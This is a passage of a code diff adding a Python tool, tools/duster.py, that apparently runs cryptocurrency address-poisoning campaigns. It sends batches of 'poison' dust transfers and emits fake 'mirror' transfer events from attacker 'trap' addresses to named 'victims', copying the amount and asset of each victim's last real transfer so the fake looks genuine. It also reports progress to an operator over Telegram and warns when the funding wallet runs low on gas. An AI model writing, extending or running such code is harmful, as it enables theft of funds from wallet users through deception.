+        batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
+        
+        tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
+        
+        if tx_hash:
+            success += len(poison_queue)
+            logger.info(f"[batch] ✅ Final multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+            
+            for tid in batch_trap_ids:
+                update_trap_dust_count(tid)
+                
+            send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=True)
+        else:
+            logger.error(f"[batch] ❌ Final multi-token batch failed")
+
+        # Summary with gas failure information
+    failed = total - success - skipped_dusted
+    logger.info(f"Completed: {success}/{total} successful. Skipped (already dusted): {skipped_dusted}. Failed: {failed} (Gas failures: {gas_failures})")
+    
+    if gas_failures > 0:
+        summary_msg = (
+            f"⚠️ Mirror batch incomplete\n"
+            f"✅ Successful: {success}/{total}\n"
+            f"⏭️ Skipped (already dusted): {skipped_dusted}\n"
+            f"❌ Failed: {failed}\n"
+            f"⛽ Gas failures: {gas_failures}\n\n"
+            f"💡 Your funding wallet needs more ETH to continue."
+        )
+    else:
+        summary_msg = f"🏁 Mirror batch complete: {success}/{total} successful.\n⏭️ Skipped (already dusted): {skipped_dusted}"
+    
+    send_telegram(summary_msg, campaign_id=campaign_id)
+
+    if job_id:
+        if success == total:
+            update_job(job_id, status='completed', progress=total, message='All done')
+        else:
+            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded ({gas_failures} gas failures)')
+
+if __name__ == "__main__":
+    setup_graceful_shutdown()
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--job-id', help='Job ID for tracking')
+    parser.add_argument('private_key', nargs='?', help='Private key for single dust send')
+    parser.add_argument('victim_address', nargs='?', help='Victim address for single dust send')
+    args = parser.parse_args()
+    
+    job_id = args.job_id
+    campaign_id = None
+    trap_ids = None
+    
+    # 🆕 Read TRAP_IDS from environment (comma-separated UUIDs)
+    trap_ids_env = os.getenv('TRAP_IDS', '').strip()
+    if trap_ids_env:
+        trap_ids = [tid.strip() for tid in trap_ids_env.split(',') if tid.strip()]
+        logger.info(f"[main] Received {len(trap_ids)} trap IDs via TRAP_IDS env var")
+    
+    if job_id:
+        update_job(job_id, status='running')
+        campaign_id = get_campaign_id_from_job(job_id)
+    else:
+        campaign_id = os.getenv('CAMPAIGN_ID')
+
+    if args.private_key and args.victim_address:
+        trap_address = w3.eth.account.from_key(args.private_key).address.lower()
+
+        # STEP 1: Fetch last transfer from blockchain
+        counterparty = get_counterparty_from_db(args.victim_address, campaign_id)
+        if not counterparty:
+            error_msg = f"❌ Mirror failed: No counterparty found for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='No counterparty found')
+            sys.exit(1)
+
+        logger.info(f"[mirror] Fetching last transfer from {args.victim_address} to {counterparty}...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(args.victim_address, counterparty)
+
+        if not fetched_asset or not fetched_amount:
+            # 🆕 Use default fallback: emit a small native transfer
+            logger.info(f"[mirror] No transfer found, using default {NATIVE_SYMBOL} fallback (1 {NATIVE_SYMBOL})")
+            fetched_asset = NATIVE_SYMBOL
+            fetched_amount = w3.to_wei(1, 'ether')
+
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+
+        # STEP 2: Emit FAKE mirror event (no real tokens needed)
+        tx_hash = emit_mirror_transfer(args.victim_address, trap_address, fetched_amount, fetched_asset, campaign_id)
+
+        if tx_hash:
+            decimals = get_token_decimals(fetched_asset)
+            amount_display = fetched_amount / (10 ** decimals)
+            
+            victim_url = get_explorer_url(args.victim_address)
+            trap_url = get_explorer_url(trap_address)
+            tx_url = get_explorer_url(tx_hash, 'tx')
+            
+            success_msg = (
+                f"🪞 *Mirror event emitted!*\n\n"
+                f"💰 Amount: {amount_display:.6f} {fetched_asset}\n"
+                f"👤 [Victim]({victim_url})\n"
+                f"🪤 [Trap]({trap_url})\n\n"
+                f"🔗 [View TX on Explorer]({tx_url})"
+            )
+            logger.info(success_msg)
+            send_telegram(success_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='completed', progress=1, message='Mirror emitted')
+        else:
+            error_msg = f"❌ Mirror emission failed for {args.victim_address}"
+            logger.error(error_msg)
+            send_telegram(error_msg, campaign_id=campaign_id)
+            if job_id:
+                update_job(job_id, status='failed', message='Mirror emission failed')
+            sys.exit(1)
+    else:
+        batch_poison(job_id=job_id, campaign_id=campaign_id, trap_ids=trap_ids)
+===== END FILE: tools/duster.py =====
